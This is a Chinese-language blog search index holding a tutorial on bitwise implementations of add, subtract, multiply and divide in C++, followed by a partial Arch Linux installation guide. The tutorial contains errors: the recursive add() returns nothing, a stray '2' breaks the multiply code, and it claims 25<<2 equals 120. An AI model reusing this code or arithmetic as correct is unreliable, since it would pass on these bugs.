<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>位运算实现加减乘除</title>
    <url>/add-subtract-multiply-divide/</url>
    <content><![CDATA[<p>计算机内部实现数据的加减乘除运算是通过对二进制位运算来实现的，基本运算&quot; + - × ÷ &quot; 均可转换为位运算。</p>
<span id="more"></span>
<p>在介绍加减乘除运算前，我们需要了解一些基本的位运算。</p>
<p>与 &amp;<br />
1 and 1 = 1<br />
1 and 0 = 0<br />
0 and 1 = 0<br />
0 and 0 = 0</p>
<p>或 |<br />
1 or 1 = 1<br />
1 or 0 = 1<br />
0 or 1 = 1<br />
0 or 0 = 0</p>
<p>异或 ^<br />
1 xor 1 = 0<br />
1 xor 0 = 1<br />
0 xor 1 = 1<br />
0 xor 0 = 0</p>
<h2 id="加法运算"><a class="markdownIt-Anchor" href="#加法运算"></a> 加法运算</h2>
<p>假如右两个32位的int整数：</p>
<blockquote>
<p>a=10: 00000000000000000000000000001010<br />
b=13: 00000000000000000000000000001101</p>
</blockquote>
<p>将这两个数10和13相加：<br />
a=01010 (10)<br />
b=01101 (13)<br />
c=10111 (23)</p>
<p>把上面的二进制分割为每一位后a+b=c</p>
<table>
<thead>
<tr>
<th>a</th>
<th>b</th>
<th>xor ^</th>
<th style="text-align:left">and &amp;</th>
<th>c</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td style="text-align:left">0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
<td style="text-align:left">0</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td style="text-align:left">0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
<td style="text-align:left">1</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td style="text-align:left">0</td>
<td>1</td>
</tr>
</tbody>
</table>
<p>我们发现 位异或^ 单纯的将两个数相加，不过并没有考虑 <strong>进位</strong> )，但是 与运算&amp; 能够表示两个二进制相加是否发生了进位（如上表所示）。</p>
<p>也就是说，利用 xor 将两个数相加，and 判断是否有进位，如果有，那个满2进1位 carry&lt;&lt;=1</p>
<blockquote>
<p>sum = a^b<br />
carry = a&amp;b<br />
carry &lt;&lt;= 1</p>
</blockquote>
<p>假如这样计算会发生什么?</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">add</span>(a,b)<br>a=<span class="hljs-number">01010</span><br>b=<span class="hljs-number">01101</span><br><br>sum=a^b =&gt; <span class="hljs-number">00111</span> <span class="hljs-comment">// 求和</span><br>carry=a&amp;b =&gt; <span class="hljs-number">01000</span> <span class="hljs-comment">// 求进位: 1&amp;1</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">10000</span> <span class="hljs-comment">//满2进1</span><br><br>如果carry进位!=<span class="hljs-number">0</span>,否则就结束<br>假设<br>a=sum=  <span class="hljs-number">00111</span><br>b=carry=<span class="hljs-number">10000</span><br>重复之前的步骤...此时新的a=sum,b=carry<br>sum=a^b =&gt; <span class="hljs-number">10111</span><br>carry=a&amp;b =&gt; <span class="hljs-number">00000</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">00000</span><br><br>此时sum=<span class="hljs-number">10111</span> 且 carry=<span class="hljs-number">0</span> <br>结果正确！<br></code></pre></div></td></tr></table></figure>
<p>sum=a^b 表明对a和b求和（不考虑进位），而 (a&amp;b)&lt;&lt;1 表明求a和b中哪个位发生了进位，并且将该位置于最高位(通过左移一位)</p>
<p>因此C++代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// 迭代1，按照上面的思路来写</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> carry=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        sum=a^b;<br>        carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>        a=sum;<br>        b=carry;<br>    &#125; <span class="hljs-keyword">while</span> (carry); <span class="hljs-comment">//判断是否有进位。如无，则表示没有可以加的值</span><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">// 迭代2</span><br><span class="hljs-comment">// 还可以修改为以下代码</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=a; <br>    <span class="hljs-keyword">int</span> carry=b;<br>    <span class="hljs-keyword">while</span> (carry)&#123;<br>        <span class="hljs-keyword">int</span> temp=sum;<br>        sum=temp^carry; <span class="hljs-comment">//a+b</span><br>        carry=(temp&amp;carry)&lt;&lt;<span class="hljs-number">1</span>; <span class="hljs-comment">//进1位</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">//递归</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;<br>    <span class="hljs-keyword">int</span> carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> sum=a^b;<br>    <span class="hljs-comment">// 将a+b转化为sum+carry</span><br>    <span class="hljs-built_in">add</span>(sum,carry);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="减法运算"><a class="markdownIt-Anchor" href="#减法运算"></a> 减法运算</h2>
<p>由于计算机只会进行加法运算，那么减法就可以转变为加法运算，这涉及到计算机的原码反码和补码知识了。这里简单提下</p>
<ul>
<li>正数的 <strong>原码=反码=补码</strong></li>
<li>负数的 原码=正数的原码且最高位置为1。<br />
如32位-3原码可表示为 10000000000000000000000000000011</li>
<li>负数的反码为其原码的最高位1不变，其余位取反(~)<br />
如32位-3反码可表示为 11111111111111111111111111111100</li>
<li>负数的补码为其反码+1<br />
如32位-3补码可表示为 11111111111111111111111111111101</li>
</ul>
<p><strong>目前补码普遍是计算机内部数值的表示方式，它很好的解决了 +0 和 -0的问题</strong></p>
<p>因此减法运算就变得十分简单的<br />
代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// a - b = a + (-b) = a + (~b + 1 )</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subtract</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> negative=<span class="hljs-built_in">add</span>(~b,<span class="hljs-number">1</span>); <span class="hljs-comment">// ~b + 1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">add</span>(a,negative); <br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>负数和正数转换(设x&gt;0)：</p>
<blockquote>
<p>-x=(~x+1)  如 -10=(~10+1)<br />
x=~(-x-1)  如 10=~(-10-1)<br />
x=~(-x)+1 如 10=~(-10)+1</p>
</blockquote>
<h2 id="乘法运算"><a class="markdownIt-Anchor" href="#乘法运算"></a> 乘法运算</h2>
<p>其实乘法也就是多个加法的累积求和，在我们小学时，25×5应该是这样计算的</p>
<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">   <span class="hljs-number"> 2 </span>5<br> × <span class="hljs-number"> 0 </span>5<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br>+<span class="hljs-number"> 0 </span>0<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br></code></pre></div></td></tr></table></figure>
<p>二进制也可以这样计算，不过就是满2进1。这里还是以25×5=125为例</p>
<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>     ×      <span class="hljs-number"> 1 </span>0<span class="hljs-number"> 1 </span>  = 5<br>————————————————————<br>      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>+   <span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0     = 0<br>+ <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1       = 25&lt;&lt;2 = 25*2^2=120<br>——————————————————— <br>  <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 0 </span>1   =<span class="hljs-number"> 125 </span>= 25+120<br></code></pre></div></td></tr></table></figure>
<p>将乘法分解为加法即可实现位运算，大致思路如下，<br />
存在一个函数 <code>int multiply(int a,int b);</code><br />
1.若b&lt;0，则对b求负化为<strong>正数</strong>，同时设置一个标识neagtive_mask记录该b是负数<br />
2.对除数b不断右移b&gt;&gt;=1并且取得b最低位的值(0或1)，直到b=0<br />
3.若为1，则add操作得sum<br />
4.a不断左移1位 a&lt;&lt;=1<br />
5.结尾判断neagtive_mask来设置sum的正负</p>
<p>注意，除数如果为负数，假设为 11111111111111111111111111111011 (-5)，那么其右移得不到b=0，至于被除数可以小于0<br />
具体代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">multiply</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-comment">// 判断正负</span><br>    <span class="hljs-keyword">bool</span> neagtive_mask=(b&lt;<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<span class="hljs-number">2</span><br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化为正数: -x=(~x+1) &lt;-&gt; x=-(-x-1) (x&gt;0) </span><br>    &#125;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (b) <br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">0x1</span>)&#123; <span class="hljs-comment">//取最低位，最低位为1，求和</span><br>            sum=<span class="hljs-built_in">add</span>(sum,a); <span class="hljs-comment">//累加</span><br>        &#125;<br>        b&gt;&gt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 除数右移将最低位溢出</span><br>        a&lt;&lt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 被除数左移</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(neagtive_mask)&#123;<br>        sum=~(sum<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="除法运算"><a class="markdownIt-Anchor" href="#除法运算"></a> 除法运算</h2>
<p>除法就相对来说复杂了，不过除法类似减法，不断地减去除数得到商，最后剩下余数<br />
这里还是以小学数学除法为例子 37÷3=12…1</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">     <span class="hljs-number">12</span> <br>  -----<br><span class="hljs-number">3</span> | <span class="hljs-number">37</span><br>  - <span class="hljs-number">3</span><br>   ----	<br>      <span class="hljs-number">7</span><br>    - <span class="hljs-number">6</span>   <br>    ---<br>      <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
<p>其中这操作还可以转换为</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>     <span class="hljs-number">1</span><br>   -----<br><span class="hljs-number">30</span> | <span class="hljs-number">37</span>    <br>   - <span class="hljs-number">30</span><br>    ----	<br>	  <span class="hljs-number">7</span>  <br>步骤<span class="hljs-number">2</span><br>    <span class="hljs-number">2</span><br>   ----<br> <span class="hljs-number">3</span>| <span class="hljs-number">7</span>   <br>   <span class="hljs-number">-6</span><br>    ---	<br>    <span class="hljs-number">1</span><br>  <br>商: <span class="hljs-number">1</span>*<span class="hljs-number">10</span>^<span class="hljs-number">1</span> + <span class="hljs-number">2</span>*<span class="hljs-number">10</span>^<span class="hljs-number">0</span> = <span class="hljs-number">10</span>+<span class="hljs-number">2</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
<p>发现了什么吗？</p>
<p>现在我们把上面十进制换成二进制</p>
<blockquote>
<p>37: 100101<br />
3:       0011<br />
7:       1101</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>         <span class="hljs-number">1</span><br>      --------<br> <span class="hljs-number">11000</span>|	<span class="hljs-number">100101</span> -&gt;a=<span class="hljs-number">37</span>  <br>       - <span class="hljs-number">11000</span> <br>    	-------	<br>	      <span class="hljs-number">1101</span> -&gt;<span class="hljs-number">7</span><br>步骤<span class="hljs-number">2</span><br>       <span class="hljs-number">1</span><br>    ------<br><span class="hljs-number">1100</span>| <span class="hljs-number">1101</span>  -&gt;a=<span class="hljs-number">7</span><br>   -  <span class="hljs-number">1100</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>步骤<span class="hljs-number">3</span><br>         <span class="hljs-number">0</span><br>    ------<br> <span class="hljs-number">110</span>|   <span class="hljs-number">1</span> <br>   -    <span class="hljs-number">0</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>商: <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">2</span> + <span class="hljs-number">0</span> <br>  = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">3</span> + <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">2</span> + <span class="hljs-number">0</span><br>  = <span class="hljs-number">8</span>+<span class="hljs-number">4</span>+<span class="hljs-number">0</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
<p>在上面例子中，除数3<strong>左移3位</strong>变为 11000，接着除数3<strong>左移2位</strong>变为 1100，最后<strong>左移1位</strong>变为 110。<br />
此时发现 <strong>被除数1</strong> 小于 <strong>除数110</strong>，因此商为0（C++语言中除法运算导致返回一个<strong>整数</strong>）。<br />
因此如果发现被除数小于除数，那么直接返回0即可。</p>
<p>于是要先找到除数应该左移的位数，且使得除数是&lt;=除数<br />
然后利用减法 :a=subtract(a,b&lt;&lt;nMove)</p>
<p>利用加法 :当前累加值r=add(前一个值累加值r,1&lt;&lt;nMove)</p>
<p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divide</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> nMove=<span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">bool</span> negative_mask=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">0</span>)&#123;<br>        a=~(a<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        negative_mask=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        <span class="hljs-comment">// 同号得正，异号的负</span><br>        negative_mask=negative_mask==<span class="hljs-literal">false</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(a&lt;b)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-comment">// 找到除数应该左移的位数，且使得除数是&lt;=除数</span><br>    <span class="hljs-keyword">for</span> ( nMove = <span class="hljs-number">0</span>; nMove&lt;<span class="hljs-number">32</span>;nMove++)&#123;<br>        <span class="hljs-keyword">if</span>((b&lt;&lt;nMove)&gt;=a)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> r=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = nMove; i &gt;=<span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-keyword">int</span> t=b&lt;&lt;i;<br>        <span class="hljs-keyword">if</span>(a&lt;t) <span class="hljs-comment">// 被除数小于除数</span><br>            <span class="hljs-keyword">continue</span>;<br>        a=<span class="hljs-built_in">subtract</span>(a,t);<br>        r=<span class="hljs-built_in">add</span>(r,<span class="hljs-number">1</span>&lt;&lt;i);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(negative_mask)&#123;<br>        r=~(r<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="输出二进制"><a class="markdownIt-Anchor" href="#输出二进制"></a> 输出二进制</h2>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printBinary</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>	<span class="hljs-keyword">char</span> strBinary[<span class="hljs-number">33</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bitmask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>	&#123;<br>		<span class="hljs-keyword">char</span> k = ((number &amp; bitmask)&gt;&gt;<span class="hljs-number">31</span>)?<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>;<br>		strBinary[i] = k;<br>		number &lt;&lt;= <span class="hljs-number">1</span>;<br>	&#125;<br>	cout &lt;&lt; strBinary &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h2 id="简单数据交换"><a class="markdownIt-Anchor" href="#简单数据交换"></a> 简单数据交换</h2>
<p>利用xor位异或来实现值交换</p>
<p>原理:</p>
<blockquote>
<p>a ^ a = 0<br />
a ^ 0 = a<br />
0 ^ a = a</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;<br>a=a^b; <span class="hljs-comment">// a=a^b;</span><br>b=a^b; <span class="hljs-comment">// b=(a^b)^b=a^(b^b)=a^0=a;</span><br>a=a^b; <span class="hljs-comment">// a=(a^b)^a=(a^a)^b=0^b=b;</span><br></code></pre></div></td></tr></table></figure>
<p>bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux从安装到基本配置</title>
    <url>/archlinux-configure/</url>
    <content><![CDATA[<p>这里介绍从安装archlinux系统到基本配置过程，基本搜集了网上和官方wiki整理而来的，把错误最低化。当然，本文也是作为我的一份手册吧…</p>
<span id="more"></span>
<p>PS: 最近更新时间 2020-02-27</p>
<h2 id="安装archlinux"><a class="markdownIt-Anchor" href="#安装archlinux"></a> 安装Archlinux</h2>
<h3 id="下载archlinux-iso"><a class="markdownIt-Anchor" href="#下载archlinux-iso"></a> 下载Archlinux ISO</h3>
<p>到官网下载 <a href="https://www.archlinux.org/download/">https://www.archlinux.org/download/</a> 并做成U盘启动盘</p>
<h3 id="一系列的命令bios"><a class="markdownIt-Anchor" href="#一系列的命令bios"></a> 一系列的命令…(BIOS)</h3>
<p>由于我是有线连接网络的，所以… 反正也可以在虚拟机里试下呗</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">dhcpcd(可选)<br>ping www.baidu.com<br>timedatectl set-ntp <span class="hljs-literal">true</span><br>fdisk /dev/sda		<span class="hljs-comment"># 分区这里应人而异。我就不多说了</span><br>    ...<br>    ...<br>mkfs.ext4 /dev/sdaX<br>    ...<br>    ...<br>mkswap /dev/sdaY     <span class="hljs-comment"># 交换分区</span><br>swapon /dev/sdaY<br>mount /dev/sda1 /mnt<br>nano /etc/pacman.d/mirrorlist  <br> <span class="hljs-comment"># 添加 	Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span><br>pacstrap /mnt base base-devel<br>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br>arch-chroot /mnt<br>ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>hwclock --systohc --localtime<br>nano /etc/locale.gen<br>    en_US.UTF-8 UTF-8<br>    zh_CN.UTF-8 UTF-8<br>    	...<br>locale-gen<br><span class="hljs-built_in">echo</span> LANG=en_US.UTF-8 &gt; /etc/locale.conf<br><span class="hljs-built_in">echo</span> myhostname &gt; /etc/hostname<br>nano  /etc/hosts<br>	127.0.0.1	localhost<br>    ::1		localhost<br>    127.0.1.1	myhostname	myhostname<br>passwd<br>pacman -S grub<br>grub-install --target=i386-pc /dev/sda	<span class="hljs-comment">#BIOS系统 ，默认 i386-pc</span><br>grub-mkconfig -o /boot/grub/grub.cfg<br><span class="hljs-built_in">exit</span><br>umount -R /mnt<br>reboot<br>pacman -S sudo net-tools wireless_tools<br>useradd -m -G wheel  whoami<br>passwd whoami<br>nano /etc/sudoers<br>	<span class="hljs-comment"># %wheel ALL=(ALL)ALL 取消注释</span><br>reboot<br>sudo dhcpcd<br>ifconfig <br><span class="hljs-comment"># 安装显卡驱动</span><br>sudo pacman -S xf86-video-intel <br><span class="hljs-comment"># 安装Xorg开源图形服务</span><br>sudo pacman -S xorg<br></code></pre></div></td></tr></table></figure>
<h3 id="uefi"><a class="markdownIt-Anchor" href="#uefi"></a> UEFI</h3>
<p>如果是UEFI，那么可以用 <code>fdisk</code> 或 <code>parted</code> 分区，grub引导</p>
